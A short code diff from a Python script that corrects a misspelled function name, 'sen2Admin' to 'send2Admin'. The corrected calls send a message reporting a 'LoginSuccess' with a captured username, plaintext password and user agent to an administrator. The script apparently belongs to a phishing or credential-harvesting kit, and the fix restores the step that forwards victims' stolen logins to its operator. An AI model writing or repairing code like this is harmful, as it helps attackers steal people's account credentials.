@@ -58,7 +58,7 @@ if __name__ == "__main__":
     status = data["status"]
 
     if status == "Error":
-        sen2Admin("<b>Start Error: </b>\n" + data["error"])
+        send2Admin("<b>Start Error: </b>\n" + data["error"])
 
     else:
         username = data["username"]
@@ -68,7 +68,7 @@ if __name__ == "__main__":
         if ok:
             title = 'LoginSuccess'
 
-        sen2Admin(
+        send2Admin(
             '<b>'+title+':</b> '+status+'\n<b>Username:</b> '+username +
             '\n<b>Password:</b> '+password+'\n<b>Useragent:</b> '+useragent
         )
